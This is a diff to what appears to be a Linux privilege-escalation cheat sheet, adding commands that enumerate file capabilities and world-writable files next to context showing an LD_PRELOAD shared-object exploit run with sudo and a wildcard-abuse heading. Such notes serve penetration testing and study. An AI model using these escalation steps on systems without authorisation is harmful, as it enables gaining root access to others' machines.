@@ -56,8 +56,12 @@ void _init() {
 $ gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
 $ sudo LD_PRELOAD=exploit.so <COMMAND>
 ```
-# Capabilties
-
+# Capabilities
+Grants specific privileges(s) to processes.
+## Enumerate Capabilities
+```shell-session
+$ find $(echo $PATH | tr ':' ' ') -type f -exec getcap {} \;
+```
 # Writeable Files/Directories
 ```shell-session
 $ find / -path /proc -prune -o -type <f/d> -perm -o+w 2>/dev/null
@@ -110,6 +114,12 @@ $ cat `/etc/resolv.conf`                  # Private DNS?
 ```shell-session
 $ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
 $ sudo -V
+```
+
+# Extras
+- All writable files by us
+```shell-session
+$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 ```
 # Wildcard Abuse
 When certain applications are run with wildcards, they can be abused:
